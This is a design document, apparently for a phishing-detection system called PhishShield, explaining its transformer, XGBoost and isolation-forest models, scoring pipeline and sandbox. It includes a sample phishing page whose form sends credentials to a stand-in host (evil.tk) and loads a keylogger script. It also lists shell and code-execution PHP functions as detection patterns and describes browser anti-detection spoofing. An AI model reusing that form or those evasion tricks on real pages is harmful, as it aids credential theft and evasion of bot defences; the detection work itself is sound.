# SECTION 1: DETAILED WORKING OF EACH MODEL IN PHISHSHIELD
## Complete line-by-line explanation of every ML model and its inner mechanics

---

## TABLE OF CONTENTS
1. [URL DistilBERT Model](#1-url-distilbert-model)
2. [Content DistilBERT Model](#2-content-distilbert-model)
3. [PHP XGBoost Model](#3-php-xgboost-model)
4. [Behavior Isolation Forest Model](#4-behavior-isolation-forest-model)
5. [Zero-Day Isolation Forest Model](#5-zero-day-isolation-forest-model)
6. [The Pipeline Orchestrator](#6-the-pipeline-orchestrator)
7. [The Playwright Sandbox](#7-the-playwright-sandbox)
8. [The PHP Static Analyzer](#8-the-php-static-analyzer)
9. [The URL Feature Extractor](#9-the-url-feature-extractor)

---

## 1. URL DistilBERT Model
**File:** `server/models/url_model.py`
**Type:** Supervised Deep Learning (Transformer-based NLP)
**Classification:** Binary (Benign=0, Malicious=1)

### What is DistilBERT?
DistilBERT is a distilled (compressed) version of Google's BERT (Bidirectional Encoder Representations from Transformers). It retains 97% of BERT's language understanding while being 60% faster and 40% smaller. It was created by Hugging Face through a process called "knowledge distillation" where a smaller "student" model learns to mimic the behavior of a larger "teacher" model (BERT).

### Architecture Specifications in PhishShield
| Parameter | Value | Reason |
|:---|:---|:---|
| Base model | `distilbert-base-uncased` | Lowercase variant for case-insensitive URL matching |
| Max token length | 128 | URLs rarely exceed 128 sub-word tokens |
| Dropout rate | 0.4 | Aggressive regularization to prevent overfitting on URL patterns |
| Number of labels | 2 | Binary: safe (0) vs malicious (1) |
| Learning rate | 2e-5 | Standard fine-tuning LR for transformers |
| Warmup ratio | 0.15 | 15% of total steps use linearly increasing LR |
| Weight decay | 0.01 | L2 regularization to control weight magnitudes |
| Gradient clipping | 0.8 | Prevents exploding gradients during backpropagation |
| Epochs | 5 | Maximum training epochs |
| Batch size | 64 | Optimized for 20k dataset + GPU memory |
| Early stopping patience | 3 | Stop if validation loss doesn't improve for 3 epochs |

### Detailed Working Process (Step-by-Step)

#### Step 1: Tokenization
When a URL like `http://paypal-secure-login.fakesite.tk/verify?id=abc123` enters the model:
1. The `DistilBertTokenizerFast` converts it into WordPiece sub-word tokens
2. Example tokenization: `["http", ":", "//", "pay", "##pal", "-", "secure", "-", "login", ".", "fake", "##site", ".", "tk", "/", "verify", "?", "id", "=", "abc", "##123"]`
3. Each token is mapped to an integer ID from the vocabulary (30,522 words)
4. The sequence is padded to exactly 128 tokens with `[PAD]` tokens
5. A special `[CLS]` token is prepended (classification token)
6. An `attention_mask` is generated: 1 for real tokens, 0 for padding

#### Step 2: Embedding Layer
1. Each token ID passes through a word embedding layer (768-dimensional vector)
2. Position embeddings are added (capturing the position of each token in the sequence)
3. Result: A matrix of shape `(128, 768)` — 128 tokens, each with 768 features

#### Step 3: Self-Attention (6 Transformer Layers)
DistilBERT has 6 transformer layers (compared to BERT's 12). Each layer performs:

1. **Multi-Head Self-Attention (12 heads):**
   - Each token computes Query, Key, Value vectors
   - Attention scores are calculated: `Attention(Q, K, V) = softmax(QK^T / √d_k) * V`
   - This allows the model to understand relationships between ALL tokens simultaneously
   - For example, "paypal" and "fakesite" in different positions get high attention scores — the model learns that a brand name appearing in a non-brand domain is suspicious

2. **Feed-Forward Network (FFN):**
   - A two-layer neural network processes each position independently
   - Inner dimension: 3072, then compressed back to 768
   - Uses GELU activation function

3. **Layer Normalization and Residual Connections:**
   - Each sub-layer has skip connections to preserve gradient flow
   - LayerNorm stabilizes training

#### Step 4: Classification Head
1. The `[CLS]` token's final 768-dimensional output is extracted
2. It passes through a dropout layer (p=0.4) for regularization
3. A linear projection maps 768 → 2 (two logits: benign, malicious)
4. Softmax converts logits to probabilities: `P(malicious) = exp(logit_1) / (exp(logit_0) + exp(logit_1))`

#### Step 5: FocalLoss Training
Normal Cross-Entropy Loss treats all samples equally. PhishShield uses **FocalLoss** because phishing datasets are imbalanced (far more benign URLs than malicious ones).

**FocalLoss formula:**
```
FL(p_t) = -α_t * (1 - p_t)^γ * log(p_t)
```
Where:
- `γ = 2.0` (focusing parameter) — hard-to-classify samples get exponentially more weight
- `α_t` = class weight derived from inverse frequency
- `p_t` = predicted probability of the correct class

**What this means practically:**
- If the model gives a benign URL P(benign)=0.95, the loss is tiny: `(1-0.95)^2 * log(0.95) ≈ 0.000128`
- If the model gives a phishing URL P(phishing)=0.3, the loss is HUGE: `(1-0.3)^2 * log(0.3) ≈ 0.59`
- The model is forced to focus its learning on the HARD examples (subtle phishing URLs that look benign)

#### Step 6: Optimization
1. **AdamW optimizer** with weight decay 0.01 — prevents weights from growing too large
2. **Linear warmup scheduler:** LR starts at 0, linearly increases to 2e-5 over the first 15% of training steps, then linearly decays to 0
3. **Gradient clipping at 0.8:** If gradient norm exceeds 0.8, it is scaled down proportionally
4. **Mixed precision training (FP16):** On GPU, forward pass uses float16 for speed, backward pass uses float32 for numerical stability using `GradScaler`

#### Step 7: Inference (Prediction)
When a URL needs to be classified:
1. Model is set to `eval()` mode (disables dropout, batch norm in eval mode)
2. URL is tokenized and padded to 128 tokens
3. Forward pass with `torch.no_grad()` (no gradient computation — 60% faster)
4. Softmax on output logits
5. Returns `P(malicious)` as a float between 0 and 1

#### Step 8: Quantization (Optional)
Dynamic quantization converts float32 Linear layer weights to int8:
- ~40% inference latency reduction
- ~4x memory reduction for weights
- Only ~0.5% accuracy loss
- Only works on CPU (CUDA int8 not supported by PyTorch in this mode)

---

## 2. Content DistilBERT Model
**File:** `server/models/content_model.py`
**Type:** Supervised Deep Learning (Transformer-based NLP)
**Classification:** Binary (Benign=0, Phishing=1)

### Key Difference from URL Model
The Content model does NOT process raw HTML directly. Raw HTML pages can be 200KB+ with thousands of tokens — far exceeding DistilBERT's 512-token limit. Instead, it uses a **structural proxy extraction** step.

### Detailed Working Process

#### Step 1: HTML Feature Extraction (`_extract_content_features`)
Given raw HTML from the sandbox, the model extracts a compact feature string:

**Example Input HTML:**
```html
<html>
<title>PayPal Login</title>
<form action="http://evil.tk/collect" method="POST">
  <input type="text" name="email">
  <input type="password" name="pass">
  <input type="hidden" name="token" value="abc123">
</form>
<iframe src="http://tracker.xyz/spy.js" style="display:none"></iframe>
<script src="http://evil.tk/keylogger.js"></script>
</html>
```

**Extracted Feature String:**
```
forms:1 password_fields:1 inputs:3 ext_links:2 hidden:1 brand:paypal brand:login title:paypal login action:http://evil.tk/collect iframes:1 scripts:1
```

The extraction process:
1. Count `<form` tags → `forms:1`
2. Count `type="password"` fields → `password_fields:1`
3. Count `<input` tags → `inputs:3`
4. Count external links (`href="https?://"`) → `ext_links:2`
5. Count `<script` tags → `scripts:1`
6. Count `<iframe` tags → `iframes:1`
7. Count hidden elements (`type="hidden"`, `display:none`) → `hidden:1`
8. Check for brand keywords (paypal, apple, google, etc.) → `brand:paypal brand:login`
9. Extract page title → `title:paypal login`
10. Extract form action URLs → `action:http://evil.tk/collect`

#### Step 2-4: Same as URL Model
The feature string is tokenized by DistilBERT and processed through the same 6-layer transformer architecture. The model learns that specific combinations like "password_fields + brand:paypal + action to external domain" = phishing.

#### Why This Approach Works
- **Dimensionality reduction:** 200KB HTML → 50-200 character feature string
- **Focus on signal:** Only phishing-relevant attributes are preserved
- **DistilBERT learns patterns:** The model captures non-obvious correlations like:
  - 3+ password fields (unusual for legitimate sites)
  - Hidden iframes + external scripts (often used for credential theft)
  - Brand keyword + external action URL (brand impersonation)

---

## 3. PHP XGBoost Model
**File:** `server/models/php_model.py`
**Type:** Supervised Machine Learning (Gradient Boosted Decision Trees)
**Classification:** Binary (Benign=0, Malicious=1)

### What is XGBoost?
XGBoost (eXtreme Gradient Boosting) is an optimized implementation of gradient boosted decision trees. It builds an ensemble of weak decision trees sequentially, where each new tree tries to correct the errors of ALL previous trees combined.

### Configuration Parameters
| Parameter | Value | Purpose |
|:---|:---|:---|
| `n_estimators` | 300 | Number of decision trees in the ensemble |
| `max_depth` | 5 | Maximum tree depth (shallow = less overfitting) |
| `learning_rate` | 0.03 | How much each tree contributes (slow learning = better generalization) |
| `subsample` | 0.85 | Use 85% of rows per tree (stochastic training) |
| `colsample_bytree` | 0.75 | Use 75% of features per tree (feature bagging) |
| `reg_lambda` | 3.0 | L2 regularization strength |
| `reg_alpha` | 1.0 | L1 regularization strength |
| `min_child_weight` | 5 | Minimum samples in a leaf node |
| `gamma` | 1.5 | Minimum gain required to split a node |
| `tree_method` | `hist` | Histogram-based split finding (faster than exact) |
| `eval_metric` | `auc` | Optimize for Area Under ROC Curve |
| `early_stopping_rounds` | 30 | Stop if val AUC doesn't improve for 30 rounds |

### Input Features (8 Dimensions)
The PHP Analyzer extracts these 8 features from raw PHP source code:

| Feature | Description | Benign Range | Malicious Range |
|:---|:---|:---|:---|
| `eval_count` | Count of `eval()`, `assert()`, `create_function()` calls | 0-0.1 | 1-5+ |
| `system_count` | Count of `system()`, `exec()`, `shell_exec()` calls | 0-0.05 | 1-4+ |
| `base64_count` | Count of `base64_decode()`, `gzinflate()`, `str_rot13()` | 0-0.2 | 2-8+ |
| `entropy` | Shannon entropy of the PHP code (randomness measure) | 3.0-4.0 | 4.5-6.5+ |
| `superglobal_count` | Count of `$_GET`, `$_POST`, `$_REQUEST` accesses | 0-1 | 3-8+ |
| `file_write_flag` | Whether `fwrite()`, `file_put_contents()` exists (0/1) | 0.3 probability | 0.8 probability |
| `network_flag` | Whether `curl_exec()`, `fsockopen()` exists (0/1) | 0.15 probability | 0.6 probability |
| `length` | Total character count of the PHP file | Normal (~1000) | Variable |

### Detailed Working Process

#### Step 1: Feature Scaling (StandardScaler)
```
X_scaled = (X - mean) / std_dev
```
Each feature is normalized to have mean=0 and standard deviation=1. This ensures that features with large magnitudes (like `length`) don't dominate features with small magnitudes (like `file_write_flag`).

#### Step 2: Class Balance Handling (scale_pos_weight)
If the dataset has 1400 benign and 600 malicious samples:
```
scale_pos_weight = 1400 / 600 = 2.33
```
This tells XGBoost to treat each malicious sample as if it were 2.33 samples, preventing the model from being biased toward predicting "benign."

#### Step 3: Tree Building (Boosting Process)
**Round 1:** Build the first tree
1. Start with initial prediction: `F_0(x) = log(n_positive / n_negative)` (log-odds)
2. Compute residuals: `r_i = y_i - sigmoid(F_0(x_i))` for each sample
3. Build a decision tree to predict these residuals
4. Example tree split: "IF eval_count > 1 AND entropy > 4.2 → predict_residual = 0.65"
5. Update predictions: `F_1(x) = F_0(x) + 0.03 * tree_1(x)` (learning rate = 0.03)

**Round 2-300:** Each subsequent tree corrects remaining errors
- The model focuses on samples that previous trees got wrong
- `gamma=1.5` means a split only happens if it reduces loss by at least 1.5
- `min_child_weight=5` means each leaf must have at least 5 samples
- `subsample=0.85` means each tree only sees 85% of the data (random)
- `colsample_bytree=0.75` means each tree only sees 75% of the 8 features (random)

#### Step 4: Regularization
XGBoost's objective function includes both loss AND regularization:
```
Obj = Σ L(y_i, ŷ_i) + Σ Ω(f_k)
Where:
Ω(f_k) = γ*T + (1/2)*λ*||w||² + α*||w||₁
```
- `γ*T`: Penalizes the number of leaves T in each tree
- `λ*||w||²`: L2 penalty on leaf weights (λ=3.0, very strong)
- `α*||w||₁`: L1 penalty on leaf weights (α=1.0, promotes sparsity)

This triple regularization prevents the model from memorizing the training data.

#### Step 5: Prediction
For a new PHP file:
1. Extract 8 features using PHPAnalyzer
2. Scale features using the saved StandardScaler
3. Run through all 300 trees simultaneously
4. Sum up all tree predictions with learning rate weighting
5. Apply sigmoid: `P(malicious) = 1 / (1 + exp(-sum))`
6. Returns a probability between 0 and 1

**Inference time: <5ms** (300 histogram-based trees are extremely fast)

---

## 4. Behavior Isolation Forest Model
**File:** `server/models/behavior_model.py`
**Type:** Unsupervised Anomaly Detection
**Output:** Anomaly score normalized to 0-1 (higher = more anomalous)

### What is Isolation Forest?
Isolation Forest is fundamentally different from all other models in PhishShield. Instead of learning what "malicious" looks like, it learns what "normal" looks like and flags anything that deviates significantly.

The core principle: **Anomalous data points are easier to isolate** (require fewer random splits).

### Configuration
| Parameter | Value | Purpose |
|:---|:---|:---|
| `n_estimators` | 200 | Number of isolation trees |
| `max_samples` | 1024 | Samples per tree (subset for efficiency) |
| `contamination` | 0.03 | Expected 3% anomaly rate |
| `bootstrap` | True | Sample with replacement |
| `n_jobs` | -1 | Use all CPU cores |

### Input Features (10 Dimensions)
Features extracted from sandbox browser interactions:

| Index | Feature | What It Measures |
|:---|:---|:---|
| 0 | `redirect_count` | Number of HTTP redirects during page load |
| 1 | `post_request_count` | POST requests (data submission) |
| 2 | `xhr_request_count` | XMLHttpRequest/Fetch API calls |
| 3 | `external_resource_count` | Resources loaded from external domains |
| 4 | `form_count` | HTML forms on the page |
| 5 | `hidden_element_count` | Hidden input fields |
| 6 | `script_count` | JavaScript script tags |
| 7 | `iframe_count` | Embedded iframes |
| 8 | `page_load_time_ms` | Total page load time in milliseconds |
| 9 | `total_request_count` | Total HTTP requests made |

### Detailed Working Process

#### Step 1: Feature Scaling
StandardScaler normalizes features to mean=0, std=1. This is critical because `page_load_time_ms` (thousands) would dominate `iframe_count` (single digits) in distance calculations.

#### Step 2: Building Isolation Trees
For each of the 200 trees:
1. Randomly sample 1024 data points from the training set
2. Randomly select a feature (e.g., `redirect_count`)
3. Randomly select a split value between the min and max of that feature
4. Split the data into left (< split) and right (>= split) branches
5. Repeat steps 2-4 recursively until:
   - Each leaf contains a single data point, OR
   - The tree reaches maximum depth: `ceil(log2(1024)) = 10`

#### Step 3: Anomaly Scoring (The Key Insight)
For a new data point:
1. Drop it through all 200 trees
2. Record the **path length** (number of edges/splits) to reach isolation in each tree
3. Calculate average path length across all trees

**Normal data point:** Requires many splits to isolate (long path length)
- Example: A normal page with redirect_count=1, form_count=1, script_count=3
- Average path length: ~8.5 (deeply embedded in the data distribution)

**Anomalous data point:** Requires very few splits (short path length)
- Example: A phishing page with redirect_count=8, post_request_count=5, hidden_element_count=7
- Average path length: ~3.2 (quickly isolated because its values are far from the norm)

#### Step 4: Score Normalization
```python
raw_score = model.score_samples(features)  # Returns negative values
# Typical range: [-0.7 (very anomalous), 0.0 (very normal)]

normalized = max(0.0, min(1.0, -raw_score * 1.5))
# -0.7 * 1.5 = 1.05 → clipped to 1.0 (very anomalous)
# -0.1 * 1.5 = 0.15 (slightly anomalous)
# 0.0 * 1.5 = 0.0 (completely normal)
```

### Why Isolation Forest for Behavior Analysis?
1. **No labeled data needed:** We don't need to label "this browsing pattern is phishing" — the model automatically learns the normal distribution
2. **Novel attack detection:** Because it learns "normal," it catches ANY deviation, including attacks it has never seen before
3. **Fast inference:** O(n_estimators * log(max_depth)) = O(200 * 10) = 2000 operations — sub-millisecond

---

## 5. Zero-Day Isolation Forest Model
**File:** `server/models/zero_day_model.py`
**Type:** Unsupervised Anomaly Detection
**Purpose:** Detect completely novel, previously unseen attack patterns

### Key Difference from Behavior Model
The Behavior model uses 10 features from runtime browser behavior. The Zero-Day model uses only **3 highly discriminative features** that capture the "DNA" of zero-day attacks:

| Feature | Description | Normal Range | Zero-Day Trigger |
|:---|:---|:---|:---|
| `entropy` | Shannon entropy of the URL | 3.0-4.0 | >5.0 (heavily encoded URLs) |
| `length` | Total URL length | 50-200 chars | >300 or <20 (anomalous) |
| `rare_function_count` | Count of `eval()` + `system()` in collected PHP | 0-1 | 3+ (code injection) |

### Working Process

#### Step 1: Feature Extraction
```python
features = ZeroDayDetector.extract_features(
    entropy=url_features.get("entropy_full_url", 0),     # From URL feature extractor
    length=url_features.get("url_length", 0),             # Raw URL length
    rare_function_count=rare_count,                        # From PHP analyzer results
)
# Returns numpy array: [entropy, length, rare_count]
```

#### Step 2: Anomaly Detection (Same algorithm as Behavior model)
- 200 isolation trees trained on normal URL+PHP feature distributions
- Score threshold: `ANOMALY_THRESHOLD = -0.4`
- If `raw_score < -0.4`: Flagged as potential zero-day threat

#### Step 3: Impact on Pipeline
When a zero-day is detected:
```python
if zd_result.get("is_zero_day"):
    scores["php"] = max(scores.get("php", 0), 0.7)  # Force PHP score to at least 0.7
    details["zero_day"] = zd_result
```
This ensures the final risk score is elevated, even if other models considered the URL benign.

### Why Only 3 Features?
Zero-day attacks are **by definition** attacks that no model has been trained on. Using too many features would cause the model to overfit on specific known attack patterns. By using only 3 highly abstract features (entropy, length, rare function count), the model captures the fundamental statistical properties of malicious behavior without memorizing specific attack signatures.

---

## 6. The Pipeline Orchestrator
**File:** `server/inference/pipeline.py`
**Core Class:** `PhishShieldPipeline`

### Risk Fusion Weights
The pipeline combines all model scores using calibrated weights:

| Component | Weight | Reason |
|:---|:---|:---|
| URL model | 0.12 | URLs alone are not very discriminative (many false positives) |
| Content model | 0.30 | HTML content analysis is highly predictive |
| Behavior model | 0.28 | Runtime behavior patterns strongly indicate phishing |
| PHP model | 0.20 | PHP code analysis provides strong evidence for webshells |
| Structural analysis | 0.10 | URL structural features (TLD, brand, IP) as baseline |

### Score Fusion Formula
```
risk = (Σ score_i * weight_i) / (Σ weight_i for available models)
```
If only URL and structural scores are available (early exit):
```
risk = (url_score * 0.12 + structural_score * 0.10) / (0.12 + 0.10)
```

### Early-Exit Logic
**Threshold configuration:**
- `SAFE_THRESHOLD = 0.15` — Below this, URL is considered clearly safe
- `BLOCK_THRESHOLD = 0.58` — Above this, URL is considered malicious

### Brand Impersonation Detection
The pipeline maintains a mapping of protected brands:
```python
BRAND_DOMAINS = {
    "paypal": "paypal.com",
    "facebook": "facebook.com",
    # ... 14 major brands
}
```

**Detection logic:**
1. Extract registered domain using `tldextract` (e.g., `fake.tk` from `paypal-login.fake.tk`)
2. Check if any brand keyword appears in the URL (`paypal` found!)
3. Check if the registered domain matches the real brand domain (`fake.tk ≠ paypal.com`)
4. Score: 0.75 for brand in path, 0.90 for brand in subdomain, 0.95 if combined with credential keywords

### False-Positive Mitigation
Free hosting domains (like `rf.gd`, `000webhost.com`) often trigger false positives due to:
- Ad-heavy redirects inflating behavior scores
- Messy HTML with many iframes inflating content scores

The mitigation:
```python
if brand_score < 0.3 and password_fields == 0 and risk > 0.3:
    risk = risk * 0.45  # Heavy discount
```
**Rationale:** If there's no brand impersonation AND no password fields, it's extremely unlikely to be an active phishing page, regardless of how messy the page behavior is.

---

## 7. The Playwright Sandbox
**File:** `server/sandbox/sandbox.py`
**Purpose:** Dynamic analysis of web pages in a controlled headless browser environment

### Stealth Evasion (15 Techniques)
The sandbox employs comprehensive anti-detection measures:
1. Removes `navigator.webdriver` flag
2. Spoofs `navigator.plugins` (mimics Chrome with 3 plugins)
3. Spoofs `navigator.mimeTypes` (PDF support)
4. Sets realistic `languages` and `language`
5. Spoofs `hardwareConcurrency: 8`
6. Spoofs `deviceMemory: 8`
7. Sets `platform: 'Win32'`
8. Creates fake `window.chrome` runtime object
9. Patches `navigator.permissions.query`
10. Spoofs `window.outerWidth/outerHeight`
11. Creates fake `navigator.connection` (4G, 50ms RTT)
12. Adds canvas fingerprint noise
13. Spoofs WebGL vendor/renderer (NVIDIA GTX 1660 SUPER)
14. Spoofs Battery API
15. Prevents iframe-based headless detection

### Resource Blocking
Blocks images, fonts, CSS, and tracker domains to achieve ~60% faster page load:
```python
BLOCKED_EXTENSIONS = {".png", ".jpg", ".gif", ".css", ".woff", ...}
TRACKER_DOMAINS = {"google-analytics.com", "facebook.net", ...}
```
Note: When screenshots are requested, CSS is NOT blocked (needed for proper rendering).

### Liveness Check (Pre-scan)
Uses lightweight `aiohttp` HEAD→GET requests (not the browser) to determine if a site is alive:
- DNS failure → Dead
- Connection refused → Dead
- HTTP 404 → Dead
- HTTP 403/401 → Alive (access denied ≠ dead)
- SSL errors → Alive (cert issues ≠ dead)
- Timeout → Alive (slow ≠ dead, will be analyzed further)

---

## 8. The PHP Static Analyzer
**File:** `server/php_analyzer/analyzer.py`
**Purpose:** Extract 8 numeric features from raw PHP source code for the XGBoost model

### Analyzed Function Categories

**Code Execution (eval family):**
`eval`, `assert`, `preg_replace`, `create_function`, `call_user_func`, `call_user_func_array`, `array_map`, `array_filter`, `usort`

**System Commands:**
`system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, `pcntl_exec`, plus backtick execution

**Obfuscation/Encoding:**
`base64_decode`, `base64_encode`, `str_rot13`, `gzinflate`, `gzuncompress`, `gzdecode`, `rawurldecode`, `urldecode`, `chr`, `ord`, `pack`, `unpack`, `hex2bin`

**Superglobals (User Input):**
`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, `$_FILES`, `$_SERVER`, `$_ENV`, `$_SESSION`

**File Operations:**
`fwrite`, `file_put_contents`, `fputs`, `fopen`, `move_uploaded_file`, `copy`, `rename`, `mkdir`, `chmod`

**Network Operations:**
`curl_exec`, `curl_init`, `file_get_contents`, `fsockopen`, `socket_create`, `stream_socket_client`, `mail`, `header`

### Suspicion Rules
A PHP file is flagged as suspicious if ANY of these conditions are true:
- `eval_count > 0` (code injection is almost never legitimate in web PHP)
- `system_count > 0` (shell commands from a web page = webshell)
- `entropy > 4.2` (code is obfuscated/packed)
- `base64_count > 3` (heavy use of encoding = hiding malicious payload)
- `superglobal_count > 2 AND file_write_flag = 1` (user input + file write = webshell pattern)

---

## 9. The URL Feature Extractor
**File:** `server/features/url_features.py`
**Purpose:** Extract 25+ lexical features from a URL string for heuristic scoring and model input

### Complete Feature List (34 Features)

| Category | Features |
|:---|:---|
| **Length** | url_length, hostname_length, path_length, query_length |
| **Entropy** | entropy_full_url, entropy_hostname, entropy_path |
| **Characters** | num_digits, digit_ratio, num_letters, letter_ratio, special_char_count, special_char_ratio |
| **Symbols** | dot_count, hyphen_count, at_count, slash_count |
| **Domain** | tld_length, num_subdomains, suspicious_tld, domain_length |
| **Network** | has_ip_address, is_https, is_http, has_port, port_number |
| **Path** | path_depth, has_php, has_exe |
| **Query** | query_param_count, has_query |
| **Brand** | brand_keyword_count, has_brand_keyword |
| **Patterns** | has_double_slash_redirect, has_hex_encoding, has_shortener_pattern |

### Entropy Calculation
Shannon entropy measures the "randomness" of a string:
```python
def _entropy(text):
    counts = Counter(text).values()
    probs = counts / sum(counts)
    return -sum(p * log2(p) for p in probs)
```
- `google.com` → entropy ≈ 3.0 (predictable, repetitive characters)
- `x7f2k9.tk/a3b?p=1kd9f` → entropy ≈ 4.8 (random, many unique characters)

Higher entropy = more likely to be an obfuscated/generated malicious URL.

### Suspicious TLD Set
Free/cheap TLDs commonly abused by phishing campaigns:
```
tk, ml, ga, cf, gq, xyz, top, pw, cc, buzz, club, work, info, online
```

### Brand Keywords
Brands commonly impersonated in phishing:
```
paypal, apple, google, microsoft, amazon, facebook, netflix, instagram,
whatsapp, linkedin, bank, secure, login, verify, account, update,
confirm, signin, security, wallet, crypto
```
